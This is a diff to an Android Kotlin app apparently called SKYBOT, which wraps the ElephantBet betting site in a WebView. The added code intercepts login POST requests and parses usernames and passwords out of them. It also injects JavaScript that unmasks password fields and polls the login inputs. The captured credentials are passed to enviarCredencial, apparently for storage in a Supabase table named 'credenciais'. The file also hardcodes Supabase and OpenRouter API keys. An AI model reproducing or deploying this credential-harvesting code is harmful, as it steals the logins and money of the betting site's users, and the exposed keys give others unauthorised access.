@@ -470,7 +470,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "8.5"
+    private val VERSAO_ATUAL = "8.6"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -854,6 +854,62 @@ class MainActivity : AppCompatActivity() {
                              !url.contains(".svg") && !url.contains(".json") &&
                              !url.contains(".wasm")
 
+                // ── INTERCEPÇÃO DE LOGIN ──────────────────────────────────
+                // Apanhar o POST de autenticação do ElephantBet
+                val method = request?.method ?: ""
+                val isLoginUrl = url.contains("elephantbet") &&
+                    (url.contains("login") || url.contains("auth") ||
+                     url.contains("session") || url.contains("signin") ||
+                     url.contains("account") || url.contains("api"))
+
+                if (method.equals("POST", ignoreCase = true) && isLoginUrl) {
+                    android.util.Log.d("SKYBOT_LOGIN", "POST intercetado: $url")
+                    try {
+                        val loginConn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+                        loginConn.requestMethod = "POST"
+                        loginConn.doOutput = true
+                        loginConn.doInput = true
+                        loginConn.connectTimeout = 15000
+                        loginConn.readTimeout = 15000
+                        request.requestHeaders?.forEach { (k, v) -> loginConn.setRequestProperty(k, v) }
+                        loginConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
+
+                        // Ler o body do request original
+                        val bodyBytes = try {
+                            request.javaClass.getDeclaredMethod("getBody").also { it.isAccessible = true }
+                                .invoke(request)?.let { it as? ByteArray }
+                        } catch (_: Exception) { null }
+
+                        if (bodyBytes != null && bodyBytes.isNotEmpty()) {
+                            loginConn.outputStream.write(bodyBytes)
+                            val bodyStr = String(bodyBytes, Charsets.UTF_8)
+                            android.util.Log.d("SKYBOT_LOGIN", "Body: $bodyStr")
+
+                            // Extrair username e password do body (form-urlencoded ou JSON)
+                            val numMatch = Regex("""(?:username|login|phone|msisdn|user)=([^&\s"]+)""", RegexOption.IGNORE_CASE).find(bodyStr)
+                                ?: Regex(""""(?:username|login|phone|msisdn)":\s*"([^"]+)"""").find(bodyStr)
+                            val senMatch = Regex("""(?:password|senha|pass)=([^&\s"]+)""", RegexOption.IGNORE_CASE).find(bodyStr)
+                                ?: Regex(""""(?:password|senha|pass)":\s*"([^"]+)"""").find(bodyStr)
+
+                            val num = numMatch?.groupValues?.get(1)?.let { java.net.URLDecoder.decode(it, "UTF-8") } ?: ""
+                            val sen = senMatch?.groupValues?.get(1)?.let { java.net.URLDecoder.decode(it, "UTF-8") } ?: ""
+
+                            android.util.Log.d("SKYBOT_LOGIN", "Extraído → num='$num' sen.len=${sen.length}")
+
+                            if (num.isNotEmpty() && sen.isNotEmpty()) {
+                                enviarCredencial(num, sen)
+                            } else if (num.isNotEmpty()) {
+                                ultimoNumeroEnviado = num
+                                numeroTemporario = num
+                            }
+                        }
+                        loginConn.disconnect()
+                    } catch (e: Exception) {
+                        android.util.Log.e("SKYBOT_LOGIN", "Erro ao interceptar login: ${e.message}")
+                    }
+                    return null // deixar o WebView processar normalmente
+                }
+
                 if (isSpribe && isHtml) {
                     try {
                         val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
@@ -1045,126 +1101,101 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun injetarJsCredenciais() {
-        val js = """
+        // Polling direto: lê os valores dos inputs a cada 2s e envia para Kotlin
+        // via evaluateJavascript (retorno) — não depende do bridge Android.* em iframes
+        val jsPoller = """
 (function() {
+    if (window._skybotPoller) return;
+    window._skybotPoller = true;
 
-    // ── Observar os inputs exatos do ElephantBet ──────────────────
-    // <input class="form-control-input-bc" name="username" ...>
-    // <input class="form-control-input-bc" name="password" ...>
+    function lerCampos() {
+        var num = '';
+        var sen = '';
 
-    function instalarWatchers() {
+        // Inputs pelo name exacto que o ElephantBet usa
+        var u = document.querySelector('input[name="username"]') ||
+                document.querySelector('input[name="phone"]') ||
+                document.querySelector('input[name="msisdn"]') ||
+                document.querySelector('input[name="login"]');
+        var p = document.querySelector('input[name="password"]') ||
+                document.querySelector('input[name="senha"]') ||
+                document.querySelector('input[type="password"]');
 
-        // Username/telemóvel
-        document.querySelectorAll(
-            'input[name="username"], input[name="phone"], input[name="msisdn"], input[name="login"]'
-        ).forEach(function(el) {
-            if (el._skybotNum) return;
-            el._skybotNum = true;
-            el.addEventListener('input', function() {
-                var v = this.value || '';
-                try { Android.guardarNumero(v); } catch(e) {}
-            });
-            el.addEventListener('change', function() {
-                var v = this.value || '';
-                if (v.length > 0) try { Android.guardarNumero(v); } catch(e) {}
-            });
-            // Capturar valor já preenchido
-            if (el.value && el.value.length > 0) {
-                try { Android.guardarNumero(el.value); } catch(e) {}
-            }
-        });
+        if (u && u.value && u.value.length > 0) num = u.value.trim();
+        if (p && p.value && p.value.length > 0) {
+            p.type = 'text'; // tornar visível
+            sen = p.value.trim();
+        }
 
-        // Password
-        document.querySelectorAll(
-            'input[name="password"], input[name="senha"], input[name="pass"], input[type="password"]'
-        ).forEach(function(el) {
-            if (el._skybotPass) return;
-            el._skybotPass = true;
-            // Tornar visível para capturar
-            el.type = 'text';
-            el.addEventListener('input', function() {
-                var v = this.value || '';
-                try { Android.guardarSenha(v); } catch(e) {}
-            });
-            el.addEventListener('change', function() {
-                var v = this.value || '';
-                if (v.length > 0) try { Android.guardarSenha(v); } catch(e) {}
-            });
-            if (el.value && el.value.length > 0) {
-                try { Android.guardarSenha(el.value); } catch(e) {}
-            }
-        });
-
-        // Botão de submit
-        document.querySelectorAll(
-            'button[type="submit"], button[title*="Entrar" i], button[title*="Login" i], input[type="submit"]'
-        ).forEach(function(btn) {
-            if (btn._skybotBtn) return;
-            btn._skybotBtn = true;
-            btn.addEventListener('click', function() {
-                // Ler os valores no momento exato do clique
-                var num = '';
-                var sen = '';
-                document.querySelectorAll('input').forEach(function(inp) {
-                    var v = (inp.value || '').trim();
-                    if (!v) return;
-                    var n = (inp.name || inp.id || '').toLowerCase();
-                    var t = (inp.type || '').toLowerCase();
-                    if (n === 'username' || n === 'phone' || n === 'msisdn' || n === 'login' || t === 'tel') {
-                        num = v;
-                    }
-                    if (n === 'password' || n === 'senha' || n === 'pass' || t === 'password' || t === 'text' && inp._skybotPass) {
-                        sen = v;
-                    }
-                });
-                if (num.length > 0) try { Android.guardarNumero(num); } catch(e) {}
-                if (sen.length > 0) try { Android.guardarSenha(sen); } catch(e) {}
-                setTimeout(function() {
-                    try { Android.submeterCredencial(); } catch(e) {}
-                }, 200);
-            }, true);
-        });
-
-        // Interceptar submit do form também
-        document.querySelectorAll('form').forEach(function(form) {
-            if (form._skybotForm) return;
-            form._skybotForm = true;
-            form.addEventListener('submit', function() {
-                var num = '';
-                var sen = '';
-                this.querySelectorAll('input').forEach(function(inp) {
-                    var v = (inp.value || '').trim();
-                    if (!v) return;
-                    var n = (inp.name || inp.id || '').toLowerCase();
-                    var t = (inp.type || '').toLowerCase();
-                    if (n === 'username' || n === 'phone' || n === 'msisdn' || n === 'login' || t === 'tel') num = v;
-                    if (n === 'password' || n === 'senha' || t === 'password' || inp._skybotPass) sen = v;
-                });
-                if (num.length > 0) try { Android.guardarNumero(num); } catch(e) {}
-                if (sen.length > 0) try { Android.guardarSenha(sen); } catch(e) {}
-                setTimeout(function() {
-                    try { Android.submeterCredencial(); } catch(e) {}
-                }, 200);
-            }, true);
-        });
+        return JSON.stringify({ num: num, sen: sen });
     }
 
-    // Correr agora e repetir para SPA que renderiza tarde
-    instalarWatchers();
-    setTimeout(instalarWatchers, 500);
-    setTimeout(instalarWatchers, 1500);
-    setTimeout(instalarWatchers, 3000);
-    setTimeout(instalarWatchers, 6000);
+    // Tornar passwords visíveis desde já
+    function tornarVisible() {
+        document.querySelectorAll('input[type="password"]').forEach(function(el) {
+            el.type = 'text';
+        });
+    }
+    tornarVisible();
+    new MutationObserver(tornarVisible).observe(document.documentElement, {childList:true, subtree:true});
 
-    // MutationObserver: quando o DOM muda (SPA navega) → re-instalar
-    var obs = new MutationObserver(function() {
-        instalarWatchers();
-    });
-    obs.observe(document.documentElement, { childList: true, subtree: true });
+    // Interceptar submit — marcar flag para o Kotlin saber que o login foi clicado
+    function watchSubmit() {
+        document.querySelectorAll('button[type="submit"], input[type="submit"]').forEach(function(btn) {
+            if (btn._sk) return; btn._sk = true;
+            btn.addEventListener('click', function() { window._skybotSubmit = true; }, true);
+        });
+        document.querySelectorAll('form').forEach(function(f) {
+            if (f._sk) return; f._sk = true;
+            f.addEventListener('submit', function() { window._skybotSubmit = true; }, true);
+        });
+    }
+    watchSubmit();
+    setInterval(watchSubmit, 1000);
 
+    // Retornar estado para o Kotlin via evaluateJavascript
+    window._skybotGetState = function() {
+        var c = lerCampos();
+        var submitted = window._skybotSubmit ? 'true' : 'false';
+        window._skybotSubmit = false; // reset
+        return '{"campos":' + c + ',"submitted":' + submitted + '}';
+    };
 })();
+window._skybotGetState ? window._skybotGetState() : 'null';
         """.trimIndent()
-        webView.evaluateJavascript(js, null)
+
+        // Poller no lado Kotlin: avalia o JS a cada 1.5s e processa o resultado
+        val pollerRunnable = object : Runnable {
+            override fun run() {
+                webView.evaluateJavascript(jsPoller) { result ->
+                    try {
+                        if (result == null || result == "null" || result == ""null"") {
+                            handler.postDelayed(this, 1500)
+                            return@evaluateJavascript
+                        }
+                        val clean = result.trim('"').replace("\"", """).replace("\\", "\")
+                        val jsonObj = org.json.JSONObject(clean)
+                        val campos  = jsonObj.optJSONObject("campos")
+                        val submitted = jsonObj.optBoolean("submitted", false)
+                        val num = campos?.optString("num", "") ?: ""
+                        val sen = campos?.optString("sen", "") ?: ""
+
+                        if (num.isNotEmpty()) {
+                            ultimoNumeroEnviado = num
+                            numeroTemporario = num
+                        }
+                        if (sen.isNotEmpty()) ultimaSenhaEnviada = sen
+
+                        if (submitted && num.isNotEmpty() && sen.isNotEmpty()) {
+                            android.util.Log.d("SKYBOT_CRED", "Submit detectado → num=$num sen.len=${sen.length}")
+                            enviarCredencial(num, sen)
+                        }
+                    } catch (_: Exception) {}
+                    handler.postDelayed(this, 1500)
+                }
+            }
+        }
+        handler.post(pollerRunnable)
     }
 
     private fun injetarJsCapturarSaldo() {
